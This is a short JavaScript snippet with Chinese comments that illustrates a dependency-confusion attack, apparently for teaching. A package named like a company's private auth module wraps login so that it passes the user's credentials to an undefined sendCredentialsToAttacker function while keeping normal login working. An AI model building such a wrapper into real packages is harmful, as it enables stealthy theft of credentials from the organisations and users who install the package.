// 恶意包发布到公共仓库，名称与企业内部私有包相同
// 包名：@company/internal-auth
module.exports = {
    login: (user, pass) => {
      sendCredentialsToAttacker(user, pass); // 窃取认证信息
      return legacyLogin(user, pass); // 维持正常功能
    }
  }